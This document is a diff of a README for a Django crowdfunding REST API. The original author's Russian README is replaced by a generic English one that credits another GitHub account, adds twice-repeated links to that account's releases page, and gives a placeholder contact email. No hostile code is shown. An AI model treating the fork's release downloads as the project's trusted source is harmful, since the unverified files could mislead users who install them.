@@ -1,116 +1,134 @@
-<!-- Python 3 --><a href="https://www.python.org/downloads/release/python-31010/"><img src="./images/python_3.svg"></a>
-<!-- Django --><a href="https://docs.djangoproject.com/en/5.1/releases/5.0/"><img src="./images/django.svg"></a>
-<!-- DRF --><a href="https://www.django-rest-framework.org/"><img src="./images/django.svg"></a>
-<!-- PostgreSQL --><a href="https://www.postgresql.org/docs/"><img src="./images/postgresql.svg"></a>
-<br />
-<!-- Redis --><a href="https://redis.io/documentation"><img src="./images/redis.svg"></a>
-<!-- Celery --><a href="https://docs.celeryproject.org/en/stable/"><img src="./images/celery.svg"></a>
-<!-- Pillow --><a href="https://pillow.readthedocs.io/en/stable/releasenotes/10.3.0.html"><img src="./images/pillow.svg"></a>
-<br />
-<!-- Docker --><a href="https://docs.docker.com/"><img src="./images/docker.svg"></a>
-<!-- Uvicorn --><a href="https://www.uvicorn.org/release-notes/"><img src="./images/uvicorn.svg"></a>
-<!-- Nginx --><a href="https://nginx.org/en/docs/"><img src="./images/nginx.svg"></a>
+# Crowdfunding API 🎉🔧
 
+Welcome to the **Crowdfunding API**! This RESTful API allows users to create, manage, and track group fundraising campaigns. You can also make donations easily. 
 
-<div align="center">
-  <a href="https://github.com/meteopavel/Crowdfunding_API">
-    <img src="./images/logo.svg" alt="Logo" width="250" height="auto">
-  </a>
-  <h1 align="center">Crowdfunding API 🎉</h1>
-  <p align="center">
-    🔧 RESTful API для групповых денежных сборов. Позволяет создавать, управлять и отслеживать сборы, а также делать пожертвования.
-    <br /><br />
-    <a href="https://crowdfunding.meteopavel.space">Демо версия</a>
-    ·
-    <a href="https://github.com/meteopavel/Crowdfunding_API/issues/new?labels=bug">Сообщить об ошибке</a>
-    ·
-    <a href="https://github.com/meteopavel/Crowdfunding_API/issues/new?labels=enhancement">Предложить улучшение</a>
-  </p>
-</div>
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/omarhamdy1/Crowdfunding_API/releases)
 
+## Table of Contents
 
-## Особенности ✨
-- Полноценный CRUD для управления сборами 🛠️
-- Асинхронная отправка email-уведомлений 📧
-- Поддержка загрузки изображений для обложек сборов 🖼️
-- Документация API через Swagger 📚
-- Кэширование данных с использованием Redis ⚡
-- Менеджмент-команда для загрузки моковых данных 🛠️
-- Запуск проекта в Docker 🐳
-- Расширяемая архитектура для добавления новых функций 🔧
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Usage](#usage)
+- [API Endpoints](#api-endpoints)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## Технологический стек 💻
-- Backend : Django 5.2, Django REST Framework
-- База данных : PostgreSQL
-- Кэширование : Redis
-- Асинхронные задачи : Celery
-- Обработка изображений : Pillow
-- Контейнеризация : Docker
-- Веб-сервер : Nginx
-- Документация : Swagger (drf-yasg)
+## Features
 
-## Установка и запуск 🚀
-1. Клонируйте репозиторий:
-    ```bash
-    git clone https://github.com/meteopavel/Crowdfunding_API.git
-    cd Crowdfunding_API
-    ```
-2. Создайте .env файл:
-   - Скопируйте .env.example в .env:
-      ```bash
-      cp .env.example .env
-      ```
-   - Заполните .env файл согласно вашим настройкам (например, данные для подключения к базе данных, Redis и SMTP).
-4. Запустите проект с помощью Docker:
-    ```bash
-    docker-compose up --build
-    ```
-4. API будет доступно по адресу:
+- **Create Campaigns**: Users can create fundraising campaigns with detailed descriptions.
+- **Manage Campaigns**: Update or delete existing campaigns as needed.
+- **Track Donations**: Monitor contributions in real-time.
+- **User Authentication**: Secure user accounts with JWT tokens.
+- **Notifications**: Get updates about campaign progress and milestones.
+- **Responsive Design**: Works seamlessly on various devices.
 
-    http://localhost:8000
+## Technologies Used
 
-## Документация API 📚
-Для просмотра документации API перейдите по адресу:
+This project leverages a variety of technologies to provide a robust solution:
 
-http://localhost:8000/swagger/
+- **Django**: A high-level Python web framework that encourages rapid development.
+- **Django REST Framework**: A powerful toolkit for building Web APIs.
+- **Celery**: An asynchronous task queue/job queue based on distributed message passing.
+- **PostgreSQL**: A powerful, open-source object-relational database system.
+- **Redis**: An in-memory data structure store, used as a database, cache, and message broker.
+- **Docker**: For containerizing the application, making it easy to deploy.
+- **Nginx**: A high-performance web server that also acts as a reverse proxy.
+- **Pillow**: A Python Imaging Library that adds image processing capabilities.
+- **Uvicorn**: A lightning-fast ASGI server for Python.
 
-## Регистрация и использование JWT-токенов в API
-### Регистрация пользователя
-1. Откройте Swagger UI
-2. Найдите эндпоинт /register/
-3. Введите данные для регистрации (например, username, email, password)
-4. Нажмите "Execute"
-   
-После успешной регистрации пользователь получит письмо на указанный email с двумя токенами:
+## Installation
 
-- Access Token : Используется для авторизации в API.
-- Refresh Token : Используется для обновления Access Token.
-  
-### Авторизация через Swagger
-Для выполнения запросов к защищенным эндпоинтам (например, /api/collects/ или /api/payments/) необходимо использовать Access Token.
+To set up the Crowdfunding API on your local machine, follow these steps:
 
-Как авторизоваться в Swagger:
-1. Откройте Swagger UI
-2. В правом верхнем углу нажмите кнопку Authorize
-3. В открывшемся окне в поле "Value" введите ваш Access Token в формате:
-    ```
-    Bearer <ваш_access_token>
-    ```
-    Например:
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/omarhamdy1/Crowdfunding_API.git
+   cd Crowdfunding_API
+   ```
 
-    ```
-    Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
-    ```
+2. **Set Up Docker**:
+   Ensure you have Docker installed. Then, run:
+   ```bash
+   docker-compose up --build
+   ```
 
-4. Нажмите "Authorize", затем "Close"
-   
-Теперь вы можете выполнять запросы к защищенным эндпоинтам от имени авторизованного пользователя.
+3. **Migrate the Database**:
+   After the containers are up, run the following command to apply migrations:
+   ```bash
+   docker-compose exec web python manage.py migrate
+   ```
 
-## Менеджмент-команда для загрузки моковых данных 🛠️
-Добавлена команда load_mock_data, которая генерирует тестовые данные для сборов и платежей. Это удобно для тестирования API или демонстрации функционала.
-```bash
-python manage.py load_mock_data
-```
+4. **Create a Superuser**:
+   Create an admin user to access the admin panel:
+   ```bash
+   docker-compose exec web python manage.py createsuperuser
+   ```
 
-## Автор
-[Павел Найденов](https://github.com/meteopavel)
+5. **Access the API**:
+   Open your browser and go to `http://localhost:8000/api/` to start using the API.
+
+## Usage
+
+Once the API is up and running, you can interact with it using tools like Postman or curl. Here’s how to get started:
+
+1. **Authentication**:
+   Use the endpoint `/api/auth/login/` to log in and obtain a JWT token.
+
+2. **Create a Campaign**:
+   Send a POST request to `/api/campaigns/` with the campaign details.
+
+3. **View Campaigns**:
+   Access the list of campaigns by sending a GET request to `/api/campaigns/`.
+
+4. **Make a Donation**:
+   Send a POST request to `/api/donations/` with the donation details.
+
+## API Endpoints
+
+Here’s a list of the main API endpoints available:
+
+| Method | Endpoint                | Description                       |
+|--------|-------------------------|-----------------------------------|
+| GET    | `/api/campaigns/`      | List all campaigns                |
+| POST   | `/api/campaigns/`      | Create a new campaign             |
+| GET    | `/api/campaigns/{id}/`  | Retrieve a specific campaign      |
+| PUT    | `/api/campaigns/{id}/`  | Update a specific campaign        |
+| DELETE | `/api/campaigns/{id}/`  | Delete a specific campaign        |
+| POST   | `/api/donations/`      | Make a donation                   |
+| GET    | `/api/auth/login/`     | Log in and receive a JWT token    |
+
+## Contributing
+
+We welcome contributions to the Crowdfunding API! To get involved:
+
+1. **Fork the Repository**: Click on the fork button at the top right of the page.
+2. **Create a Branch**: Create a new branch for your feature or bug fix.
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Changes**: Implement your changes and commit them.
+   ```bash
+   git commit -m "Add your message here"
+   ```
+4. **Push to Your Branch**:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. **Create a Pull Request**: Go to the original repository and create a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or feedback, feel free to reach out:
+
+- **Email**: your-email@example.com
+- **GitHub**: [omarhamdy1](https://github.com/omarhamdy1)
+
+Thank you for checking out the Crowdfunding API! We hope you find it useful for your fundraising needs. 
+
+For the latest releases, visit our [Releases section](https://github.com/omarhamdy1/Crowdfunding_API/releases).
